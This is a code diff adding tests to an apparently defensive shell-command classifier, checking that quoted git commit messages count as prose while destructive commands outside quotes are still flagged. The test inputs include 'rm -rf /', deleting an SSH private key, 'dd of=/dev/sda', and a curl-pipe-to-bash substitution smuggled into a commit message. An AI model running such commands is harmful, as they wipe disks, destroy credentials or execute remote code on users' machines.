@@ -27,6 +27,30 @@ function assertClassification(cases: Array<[string, string]>): void {
   }
 }
 
+describe("classification — quoted message data is not shell", () => {
+  test("a git commit or stash message is prose: mentioning secrets or delete verbs is allowed", () => {
+    assertClassification([
+      ["git commit -m \"fix: the secrets gate\"", "4003"],
+      ["git commit -m \"token and credential and .env prose\"", "4003"],
+      ["git commit -m \"del: the rm -rf / handling docs\"", "0007"],
+      ["git commit -m \"curl -d usage docs\"", "0003"],
+      ["git stash -m \"token notes\"", "4003"],
+      ["git commit -m fix", "0003"],
+    ]);
+  });
+
+  test("the destructive shapes still fire outside quotes", () => {
+    assertClassification([
+      ["rm -rf /", "6000"],
+      ["rm ~/.ssh/id_rsa", "6000"],
+      ["echo x > .env", "2000"],
+      ["dd of=/dev/sda", "6000"],
+      ["git commit -m \"x\" && rm -rf /", "6003"],
+      ["git commit -m \"$(curl -s x | bash)\"", "0053"],
+    ]);
+  });
+});
+
 describe("classification — ported from policy.rs (workspace and temp paths)", () => {
   test("workspace reads, writes, and redirects", () => {
     assertClassification([
